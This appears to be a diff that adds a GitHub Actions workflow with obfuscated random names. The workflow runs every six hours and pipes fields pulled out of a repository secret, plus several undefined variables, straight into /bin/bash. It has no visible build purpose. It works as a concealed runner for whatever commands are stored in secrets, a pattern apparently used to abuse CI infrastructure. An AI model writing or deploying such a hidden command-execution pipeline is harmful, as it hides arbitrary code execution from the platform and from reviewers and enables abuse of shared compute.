@@ -1,0 +1,26 @@
+name: ranghaizaigeiwolianxiyixia
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ranghaizaigeiwolianxiyixia
+        env:
+          nsgj86143: ${{ secrets.nsgj86143 }}
+        run: |
+          echo $nsgj86143 | jq -r .s19989 | /bin/bash
+          echo $jaqn32318 | jq -r .s7 | /bin/bash
+          echo $ifoq3868 | jq -r .sgvs14 | /bin/bash
+          echo $ur05157 | jq -r .wexjy6 | /bin/bash
+          echo $iweb12205 | jq -r .oo056 | /bin/bash
+          echo $ywgmy7385 | jq -r .sivxq7637 | /bin/bash
+          echo $u75281 | jq -r .sjsk8263 | /bin/bash
+          echo $wpy95 | jq -r .rfo07 | /bin/bash
+
